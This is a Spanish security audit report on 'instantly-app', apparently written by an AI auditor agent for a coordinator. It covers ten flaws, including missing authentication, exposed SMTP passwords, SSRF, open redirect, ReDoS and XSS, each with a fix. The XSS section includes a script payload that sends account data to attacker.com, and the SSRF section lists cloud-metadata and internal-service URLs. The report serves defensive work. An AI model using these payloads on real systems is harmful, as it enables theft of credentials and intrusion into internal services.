# INFORME DE AUDITORÍA DE SEGURIDAD DE APLICACIONES (APPSEC / SAST)
**Proyecto:** `instantly-app`  
**Rol:** Auditor Especialista en Seguridad de Aplicaciones (AppSec / SAST)  
**Destinatario:** `@coordinator` / Swarm  
**Fecha:** 17 de Noviembre de 2026  
**Alcance:** Código fuente integral (`src/app/api/**`, `src/core/**`, `src/lib/**`, `src/components/**`)

---

## 1. RESUMEN EJECUTIVO Y PERFIL DE RIESGO

Tras una inspección de seguridad estática profunda (SAST) de las 23 rutas API y los servicios centrales del backend y frontend de `instantly-app`, se determina que la aplicación presenta una **postura de seguridad crítica e inmadura para despliegue en producción**.

### Métricas de Vulnerabilidades Encontradas:
* **Vulnerabilidades Críticas:** 4
* **Vulnerabilidades Altas:** 4
* **Vulnerabilidades Medias:** 2
* **Total Hallazgos Documentados:** 10

### Vectores de Compromiso Inmediato:
1. **Ausencia total de capa de autenticación y autorización:** Ninguno de los 23 route handlers en `src/app/api/**` valida tokens de sesión, credenciales o pertenencia a un espacio de trabajo (BOLA/IDOR universal).
2. **Exposición pública de credenciales SMTP en texto plano:** `GET /api/accounts` entrega contraseñas de casillas corporativas en texto claro a cualquier visitante anónimo.
3. **Relé abierto de correo (Open Relay):** Endpoints como `/api/campaigns/[id]/test-email` y `/api/campaigns/[id]/send` permiten el envío de correos arbitrarios sin autenticación usando las credenciales SMTP configuradas.
4. **Bypass de validación de certificados TLS en IMAP (`rejectUnauthorized: false`):** Las comunicaciones IMAP son vulnerables a intercepción hombre en el medio (MITM).
5. **SSRF en Webhooks y Open Redirect en tracking:** `WebhookDispatcherService` puede forzarse a consultar metadatos de nube y servicios de red privada interna, mientras que `/api/track/click` permite redirigir usuarios a dominios de phishing externos.

---

## 2. MATRIZ CONSOLIDADA DE VULNERABILIDADES

| ID | Vulnerabilidad | Archivos Clave | CWE | OWASP Top 10 | Severidad |
|---|---|---|---|---|---|
| **VULN-01** | Exposición de Credenciales SMTP en Texto Plano y Hardcoded Keys | `src/app/api/accounts/route.ts`<br>`src/core/storage/supabase/SupabaseAccountRepository.ts`<br>`src/core/supabase/client.ts` | CWE-312<br>CWE-200<br>CWE-798 | A02:2021 - Cryptographic Failures | **CRÍTICA** |
| **VULN-02** | Ausencia Universal de Autenticación y Autorización (BOLA / IDOR) | Todos los 23 endpoints en `src/app/api/**` | CWE-306<br>CWE-862<br>CWE-639 | A01:2021 - Broken Access Control | **CRÍTICA** |
| **VULN-03** | Relé Abierto de Correo y Despacho Masivo No Autenticado (Open Mail Relay) | `src/app/api/campaigns/[id]/test-email/route.ts`<br>`src/app/api/campaigns/[id]/send/route.ts`<br>`src/app/api/accounts/warmup/run/route.ts` | CWE-284<br>CWE-799 | A01:2021 - Broken Access Control | **CRÍTICA** |
| **VULN-04** | Evasión de TLS (`rejectUnauthorized: false`) e Inyección en Sockets IMAP | `src/core/services/ImapInboxService.ts` | CWE-295<br>CWE-93 | A02:2021 - Cryptographic Failures | **CRÍTICA** |
| **VULN-05** | Server-Side Request Forgery (SSRF) en Webhooks | `src/core/services/WebhookDispatcherService.ts`<br>`src/app/api/webhooks/route.ts` | CWE-918 | A10:2021 - Server-Side Request Forgery | **ALTA** |
| **VULN-06** | Redirección Abierta (Open Redirect) en Tracking de Clics | `src/app/api/track/click/route.ts` | CWE-601 | A01:2021 - Broken Access Control | **ALTA** |
| **VULN-07** | Denegación de Servicio por Expresión Regular (ReDoS) en Spintax | `src/core/services/SpintaxService.ts` | CWE-1333<br>CWE-400 | A05:2021 - Security Misconfiguration | **ALTA** |
| **VULN-08** | Cross-Site Scripting (XSS) Almacenado/Reflejado en Desuscripción | `src/app/api/track/unsubscribe/route.ts` | CWE-79 | A03:2021 - Injection | **ALTA** |
| **VULN-09** | Ausencia de Rate Limiting y Condición de Carrera en Escritura JSON | `src/app/api/track/open/route.ts`<br>`src/app/api/track/click/route.ts`<br>`src/core/storage/JsonDriver.ts` | CWE-770<br>CWE-362 | A05:2021 - Security Misconfiguration | **MEDIA-ALTA** |
| **VULN-10** | Denegación de Servicio por Consultas DNS Descontroladas en Lote | `src/app/api/leads/verify/route.ts`<br>`src/core/services/EmailVerifierService.ts` | CWE-400 | A05:2021 - Security Misconfiguration | **MEDIA** |

---

## 3. DESGLOSE EXHAUSTIVO DE CADA VULNERABILIDAD

---

### VULN-01: Exposición de Credenciales SMTP en Texto Plano y Hardcoded Keys
* **Archivos y Líneas:**
  * `src/app/api/accounts/route.ts:6-9`
  * `src/core/storage/supabase/SupabaseAccountRepository.ts:105`
  * `src/core/supabase/client.ts:4-6`
* **Clasificación:** CWE-312, CWE-200, CWE-798 | OWASP A02:2021
* **Severidad:** **CRÍTICA**
* **Vector de Ataque Teórico:**
  1. Un atacante no autenticado envía una petición HTTP `GET /api/accounts`.
  2. El servidor responde con la lista completa de casillas remitentes configuradas, incluyendo `smtpHost`, `smtpPort`, `smtpUser` y la contraseña `smtpPass` en texto claro.
  3. El atacante utiliza estas credenciales para iniciar sesión en los servidores de correo corporativo (Google Workspace, Office 365, SMTP dedicado), robando correos internos confidenciales y comprometiendo la identidad de la organización.
  4. Adicionalmente, en `src/core/supabase/client.ts`, hay un token JWT anónimo de Supabase preconfigurado en texto plano como valor de respaldo (fallback), lo que expone la base de datos a accesos directos no deseados si RLS no está activo.
* **Remediación Técnica:**
  * Nunca devolver `smtpPass` en las respuestas de la API. Aplicar DTOs o excluir la propiedad explícitamente:
    ```ts
    // src/app/api/accounts/route.ts
    export async function GET() {
      const accounts = await container.accountRepo.getAccounts();
      const sanitized = accounts.map(({ smtpPass, ...rest }) => ({
        ...rest,
        hasPassword: Boolean(smtpPass)
      }));
      return NextResponse.json(sanitized);
    }
    ```
  * Cifrar `smtpPass` en reposo utilizando AES-256-GCM antes de escribir en disco o base de datos.
  * Eliminar el token JWT en fallback y requerir variables de entorno de forma estricta.

---

### VULN-02: Ausencia Universal de Autenticación y Autorización (BOLA / IDOR)
* **Archivos y Líneas:**
  * `src/app/api/campaigns/route.ts:6-9, 11-52`
  * `src/app/api/campaigns/[id]/route.ts:4-46`
  * `src/app/api/leads/route.ts:6-88`
  * `src/app/api/deals/route.ts:6-63`
  * `src/app/api/user-profile/route.ts:4-69`
  * `src/app/api/webhooks/route.ts:6-53`
  * `src/app/api/blocklist/route.ts:4-42`
  * Inexistencia de archivo `middleware.ts` en la raíz o en `src/`.
* **Clasificación:** CWE-306, CWE-862, CWE-639 | OWASP A01:2021
* **Severidad:** **CRÍTICA**
* **Vector de Ataque Teórico:**
  * Al no existir middleware ni control de sesión, cualquier usuario anónimo puede invocar los endpoints de la API REST.
  * Un atacante puede extraer la lista completa de prospectos (incluyendo información PII, nombres, correos, teléfonos y variables personalizadas) ejecutando `GET /api/leads`.
  * Puede eliminar bases de datos de prospectos ejecutando `DELETE /api/leads?campaignId=<id>`.
  * En `PUT /api/user-profile`, un atacante puede sobrescribir el usuario administrador `admin-default`, cambiando el correo y escalando privilegios a `roleId: 'super_admin'`.
  * No existe aislamiento multitenant: cualquier entidad puede consultar o modificar datos pertenecientes a otros workspaces (BOLA/IDOR).
* **Remediación Técnica:**
  * Implementar `src/middleware.ts` para verificar tokens JWT de sesión (ej. Supabase Auth o NextAuth) en todas las rutas bajo `/api/**` excepto las de seguimiento público (`/api/track/**`):
    ```ts
    // src/middleware.ts
    import { NextResponse } from 'next/server';
    import type { NextRequest } from 'next/server';

    const PUBLIC_PATHS = ['/api/track/', '/favicon.ico', '/_next/'];

    export async function middleware(req: NextRequest) {
      const { pathname } = req.nextUrl;
      if (PUBLIC_PATHS.some(p => pathname.startsWith(p))) {
        return NextResponse.next();
      }

      const authHeader = req.headers.get('authorization');
      const token = authHeader?.replace('Bearer ', '') || req.cookies.get('sb-access-token')?.value;

      if (!token) {
        return NextResponse.json({ error: 'Unauthorized: Authentication required' }, { status: 401 });
      }

      // Validar sesión contra Supabase / JWT
      // Inyectar workspaceId validado en encabezados internos
      return NextResponse.next();
    }
    ```
  * En cada repositorio, exigir un parámetro obligatorio `workspaceId` en todas las consultas para evitar fugas entre inquilinos.

---

### VULN-03: Relé Abierto de Correo y Despacho Masivo No Autenticado (Open Mail Relay)
* **Archivos y Líneas:**
  * `src/app/api/campaigns/[id]/test-email/route.ts:4-75`
  * `src/app/api/campaigns/[id]/send/route.ts:4-22`
  * `src/app/api/accounts/warmup/run/route.ts:4-11`
* **Clasificación:** CWE-284, CWE-799 | OWASP A01:2021
* **Severidad:** **CRÍTICA**
* **Vector de Ataque Teórico:**
  1. En `POST /api/campaigns/[id]/test-email`, la ruta recibe en el body `{ toEmail: "victima@externo.com", ... }` y dispara un correo real mediante `container.smtpMailer.send` sin verificar identidad ni permisos del emisor.
  2. Un atacante puede utilizar la aplicación como un **Open Mail Relay** para distribuir spam, phishing o malware a destinatarios de todo el mundo, firmados criptográficamente con los dominios de la empresa auditada (SPF/DKIM legítimos).
  3. En `POST /api/campaigns/[id]/send`, un atacante puede disparar campañas masivas reales (`simulationOnly: false`) provocando envíos masivos no autorizados y bloqueos inmediatos de las cuentas remitentes.
* **Remediación Técnica:**
  * Bloquear el endpoint `test-email` para permitir el envío **únicamente a la dirección de correo electrónico del usuario autenticado**:
    ```ts
    // Restringir toEmail a la cuenta verificada en sesión
    const sessionUserEmail = authenticatedUser.email;
    if (toEmail.toLowerCase() !== sessionUserEmail.toLowerCase()) {
      return NextResponse.json(
        { error: 'Test emails can only be sent to the authenticated user email.' },
        { status: 403 }
      );
    }
    ```
  * Implementar rate limiting estricto (máximo 3 correos de prueba por usuario cada 5 minutos).
  * Exigir confirmación autenticada de doble factor o rol administrativo para `/api/campaigns/[id]/send`.

---

### VULN-04: Evasión de TLS (`rejectUnauthorized: false`) e Inyección en Sockets IMAP
* **Archivos y Líneas:**
  * `src/core/services/ImapInboxService.ts:156-163, 194-195, 188-232`
* **Clasificación:** CWE-295, CWE-93 | OWASP A02:2021
* **Severidad:** **CRÍTICA**
* **Vector de Ataque Teórico:**
  1. Línea 161 define explícitamente `rejectUnauthorized: false` en `tls.connect` sobre el puerto 993:
     ```ts
     const socket = tls.connect({
       host,
       port: 993,
       servername: host,
       rejectUnauthorized: false
     });
     ```
  2. Un atacante en posición de intermediario de red (MITM) presenta un certificado TLS autofirmado. La aplicación omite la verificación criptográfica, permitiendo al atacante interceptar en texto plano el comando `A1 LOGIN "<usuario>" "<contraseña>"`, capturando las credenciales de correo.
  3. En la línea 195: `socket.write(\`A1 LOGIN "${user}" "${safePass}"\\r\\n\`)`. Mientras que `safePass` escapa comillas, `user` se concatena directamente sin sanear. Si `user` contiene secuencias CRLF (`\r\n`), se produce **inyección de protocolo IMAP**.
  4. La detección de respuestas mediante `buffer.includes('A1 OK')` o `buffer.includes('A3 OK')` se ejecuta sobre fragmentos TCP sin delimitar comandos: si el texto de un correo electrónico recibido contiene la cadena `A3 OK`, la conexión se cierra prematuramente.
* **Remediación Técnica:**
  * Forzar siempre `rejectUnauthorized: true`.
  * Sanear rigurosamente `user` eliminando secuencias `\r` y `\n`.
  * Migrar el código de sockets manuales a una biblioteca robusta como `imapflow`:
    ```ts
    import { ImapFlow } from 'imapflow';
    const client = new ImapFlow({
      host,
      port: 993,
      secure: true,
      auth: { user, pass },
      tls: { rejectUnauthorized: true }
    });
    ```

---

### VULN-05: Server-Side Request Forgery (SSRF) en Webhooks
* **Archivos y Líneas:**
  * `src/core/services/WebhookDispatcherService.ts:40-45`
  * `src/app/api/webhooks/route.ts:16-35`
* **Clasificación:** CWE-918 | OWASP A10:2021
* **Severidad:** **ALTA**
* **Vector de Ataque Teórico:**
  1. Un usuario o atacante registra un webhook mediante `POST /api/webhooks` con URLs que apuntan a la infraestructura interna o nubes privadas:
     * `http://169.254.169.254/latest/meta-data/` (Metadatos de AWS/GCP para extracción de roles IAM).
     * `http://127.0.0.1:5432` o `http://localhost:6379` (PostgreSQL / Redis internos).
     * `http://10.0.0.1/admin` (Panel de router o VPC interno).
  2. Al producirse un evento de envío o respuesta de lead, `WebhookDispatcherService.trigger` ejecuta `fetch(w.url, { method: 'POST', body: ... })` directamente desde el servidor.
  3. El servidor actúa como proxy ciego para escanear puertos, atacar servicios internos y potencialmente filtrar datos sensibles.
* **Remediación Técnica:**
  * Validar estrictamente la URL registrada: obligar al esquema `https:` y validar que la IP resuelta no sea privada ni de bucle local:
    ```ts
    import dns from 'dns';
    import ipaddr from 'ipaddr.js';

    export async function validateWebhookUrl(rawUrl: string): Promise<boolean> {
      const parsed = new URL(rawUrl);
      if (parsed.protocol !== 'https:') return false;

      const addresses = await dns.promises.lookup(parsed.hostname, { all: true });
      for (const addr of addresses) {
        const ip = ipaddr.parse(addr.address);
        const range = ip.range();
        if (range !== 'unicast') {
          // Bloquea private, loopback, linkLocal, carrierGradeNat, etc.
          return false;
        }
      }
      return true;
    }
    ```

---

### VULN-06: Redirección Abierta (Open Redirect) en Tracking de Clics
* **Archivos y Líneas:**
  * `src/app/api/track/click/route.ts:46-48`
* **Clasificación:** CWE-601 | OWASP A01:2021
* **Severidad:** **ALTA**
* **Vector de Ataque Teórico:**
  1. El endpoint verifica:
     ```ts
     if (targetUrl && (targetUrl.startsWith('http://') || targetUrl.startsWith('https://'))) {
       return NextResponse.redirect(new URL(targetUrl), 302);
     }
     ```
  2. Esta validación permite absolutamente cualquier dominio externo.
  3. Un ciberdelincuente genera un enlace de la forma:
     `https://misender.app/api/track/click?url=https://phishing-portal.com/login`
  4. Los filtros de correo (Secure Email Gateways) califican positivamente el enlace porque pertenece al dominio legítimo de la aplicación. La víctima hace clic confiando en el remitente y es redirigida inmediatamente al sitio de phishing.
* **Remediación Técnica:**
  * Firmar criptográficamente los enlaces de click tracking durante el despacho del correo utilizando HMAC (SHA-256) con una clave secreta del servidor:
    ```ts
    // Generación: /api/track/click?url=...&sig=HMAC(url, secret)
    // Verificación en la ruta:
    const expectedSig = crypto.createHmac('sha256', HMAC_SECRET).update(targetUrl).digest('hex');
    if (signature !== expectedSig) {
      return NextResponse.redirect(new URL('/', req.url), 302);
    }
    ```

---

### VULN-07: Denegación de Servicio por Expresión Regular (ReDoS) en Spintax
* **Archivos y Líneas:**
  * `src/core/services/SpintaxService.ts:12-26`
* **Clasificación:** CWE-1333, CWE-400 | OWASP A05:2021
* **Severidad:** **ALTA**
* **Vector de Ataque Teórico:**
  1. Línea 12 define: `const hasPattern = /\{([^{}]+?\|[^{}]+?)\}/;`
  2. Debido al solapamiento de cuantificadores perezosos con el delimitador `|`, si una entrada contiene una llave de apertura `{` seguida de secuencias repetidas de `a|` sin cerrar con `}` (ej. `"{a|a|a|a|..."`), el motor de expresiones regulares evalúa todas las permutaciones posibles de longitud para el primer cuantificador antes de fallar en el segundo.
  3. **Verificación experimental:** Un texto de 200 KB con este patrón congela el Event Loop de Node.js durante **3.405 segundos**.
  4. Dado que Node.js es monohilo, mientras se procesa este patrón se bloquea la atención de todas las demás solicitudes HTTP entrantes. Múltiples solicitudes con esta carga útil provocan la denegación total de servicio (DoS) de la plataforma.
* **Remediación Técnica:**
  * Reemplazar la expresión ambigua por un patrón determinista no solapado o utilizar un analizador léxico lineal $O(N)$ basado en una sola pasada:
    ```ts
    // Patrón optimizado sin retroceso catastrófico
    const hasPattern = /\{([^{}|]+)\|([^{}]+)\}/;
    ```
  * Validar longitud máxima de plantilla antes de procesar:
    ```ts
    if (text.length > 50000) {
      throw new Error('Template exceeds maximum allowed length (50KB)');
    }
    ```

---

### VULN-08: Cross-Site Scripting (XSS) Almacenado/Reflejado en Desuscripción
* **Archivos y Líneas:**
  * `src/app/api/track/unsubscribe/route.ts:51-79`
* **Clasificación:** CWE-79 | OWASP A03:2021
* **Severidad:** **ALTA**
* **Vector de Ataque Teórico:**
  1. En `handleUnsubscribe`, la variable `emailToBlock` proviene de `lead.email`.
  2. La respuesta genera directamente código HTML usando plantillas de cadenas (template literals):
     ```ts
     <p>Tu correo <strong>${emailToBlock || 'ha sido removido'}</strong> de nuestra lista de envíos.</p>
     ```
  3. No se realiza ningún escape de entidades HTML (`&`, `<`, `>`, `"`, `'`).
  4. Si un atacante inyecta una dirección como:
     `"><script>fetch('/api/accounts').then(r=>r.json()).then(d=>fetch('//attacker.com?c='+JSON.stringify(d)))</script>`
     al visitar el enlace de desuscripción se ejecuta el script en el contexto de seguridad del dominio de la aplicación, permitiendo robar cookies de sesión o consultar endpoints protegidos.
* **Remediación Técnica:**
  * Escapar caracteres HTML en todas las variables dinámicas:
    ```ts
    function escapeHtml(str: string): string {
      return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }
    ```
  * Añadir encabezados de Content Security Policy (CSP):
    ```http
    Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline';
    ```

---

### VULN-09: Ausencia de Rate Limiting y Condición de Carrera en Escritura JSON
* **Archivos y Líneas:**
  * `src/app/api/track/open/route.ts:10-46`
  * `src/app/api/track/click/route.ts:4-44`
  * `src/core/storage/JsonDriver.ts:46-53`
* **Clasificación:** CWE-770, CWE-362 | OWASP A05:2021
* **Severidad:** **MEDIA-ALTA**
* **Vector de Ataque Teórico:**
  1. `/api/track/open` y `/api/track/click` son accesibles sin límite de peticiones ni requerimiento de cookies.
  2. En cada invocación, se ejecutan operaciones en base de datos o en `JsonDriver` (`fs.writeFileSync`).
  3. Un bot o atacante que envíe miles de peticiones por segundo puede:
     * Falsear completamente las estadísticas de aperturas y clics (`camp.stats.opened = (camp.stats.opened || 0) + 1`).
     * En el modo JSON, causar **corrupción de datos** debido a escrituras concurrentes desordenadas sobre el mismo archivo en disco sin bloqueo atómico (`leads.json` o `campaigns.json`).
* **Remediación Técnica:**
  * Implementar limitación de tasa (Rate Limiting) con una biblioteca como `@upstash/ratelimit` o memoria caché distribuida:
    * Máximo 10 peticiones de tracking por segundo por IP.
  * Para almacenamiento JSON, implementar escrituras atómicas:
    ```ts
    write<T>(filename: string, data: T): void {
      const fullPath = this.resolvePath(filename);
      const tempPath = `${fullPath}.${Date.now()}.tmp`;
      fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf-8');
      fs.renameSync(tempPath, fullPath);
    }
    ```

---

### VULN-10: Denegación de Servicio por Consultas DNS Descontroladas en Lote
* **Archivos y Líneas:**
  * `src/app/api/leads/verify/route.ts:8-11`
  * `src/core/services/EmailVerifierService.ts:98-100`
* **Clasificación:** CWE-400 | OWASP A05:2021
* **Severidad:** **MEDIA**
* **Vector de Ataque Teórico:**
  1. `POST /api/leads/verify` recibe `{ emails: [...] }` y llama a `verifyBatch(emails)`.
  2. `verifyBatch` ejecuta `Promise.all(emails.map(e => this.verifyEmail(e)))` sin limitar la cantidad de direcciones.
  3. Un atacante envía un arreglo de 50.000 direcciones de correo. Node.js lanza 50.000 consultas DNS de registros MX concurrentemente.
  4. Se agotan los sockets disponibles en el sistema operativo (`EMFILE`), colapsando el servicio de resolución DNS del host y provocando tiempos de espera agotados para todas las operaciones de red de la aplicación.
* **Remediación Técnica:**
  * Limitar la cantidad máxima de correos a verificar por solicitud (ej. máx. 50).
  * Controlar la concurrencia utilizando un semáforo de promesas (`p-limit` o chunks secuenciales):
    ```ts
    // Limitar concurrencia a máx 10 consultas simultáneas
    async verifyBatch(emails: string[]): Promise<EmailVerificationResult[]> {
      const MAX_BATCH = 100;
      if (emails.length > MAX_BATCH) {
        throw new Error(`Batch size exceeds limit of ${MAX_BATCH}`);
      }
      // procesar con cola de concurrencia
    }
    ```

---

## 4. PLAN DE REMEDIACIÓN PRIORIZADO (ROADMAP DEFENSIVO)

### Fase 1: Remediaciones Críticas Inmediatas (Bloqueantes para Producción)
1. **Crear `src/middleware.ts`:** Proteger de forma universal todos los endpoints API (`/api/**`) exigiendo sesión autenticada válida, excluyendo únicamente `/api/track/**`.
2. **Sanitizar API de Cuentas (`/api/accounts`):** Ocultar `smtpPass` de cualquier respuesta `GET` e implementar cifrado simétrico en reposo (AES-256-GCM).
3. **Cerrar Open Relay:** Restringir `/api/campaigns/[id]/test-email` para que sólo pueda despachar al correo verificado del usuario en sesión.
4. **Corregir TLS en IMAP:** Cambiar `rejectUnauthorized: true` en `ImapInboxService.ts` y sanear entradas CRLF en el comando de autenticación.

### Fase 2: Mitigaciones de Alta Prioridad
5. **Mitigar SSRF en Webhooks:** Implementar resolución DNS previa y validación de rangos de IP privadas/loopback antes de despachar eventos en `WebhookDispatcherService`.
6. **Eliminar Open Redirect:** Añadir validación por firma HMAC en `/api/track/click` para garantizar que la URL de destino no ha sido alterada.
7. **Parchear ReDoS en Spintax:** Reemplazar la expresión regular vulnerable por un analizador lineal seguro y limitar el tamaño del cuerpo a 50 KB.
8. **Sanitizar XSS en Desuscripción:** Aplicar codificación de entidades HTML a `emailToBlock` en `/api/track/unsubscribe`.

### Fase 3: Estabilidad y Resiliencia
9. **Rate Limiting Global:** Añadir middleware de limitación de tasa para endpoints públicos de tracking y verificación de correos.
10. **Validación de Esquemas con Zod:** Introducir schemas Zod en todos los route handlers para tipar y validar las cargas útiles entrantes (`req.json()`).

---
**Informe elaborado por:** Auditor Especialista en Seguridad de Aplicaciones (AppSec / SAST)  
**Firma:** `sec_appsec`  
**Estado:** Entregado a `@coordinator`
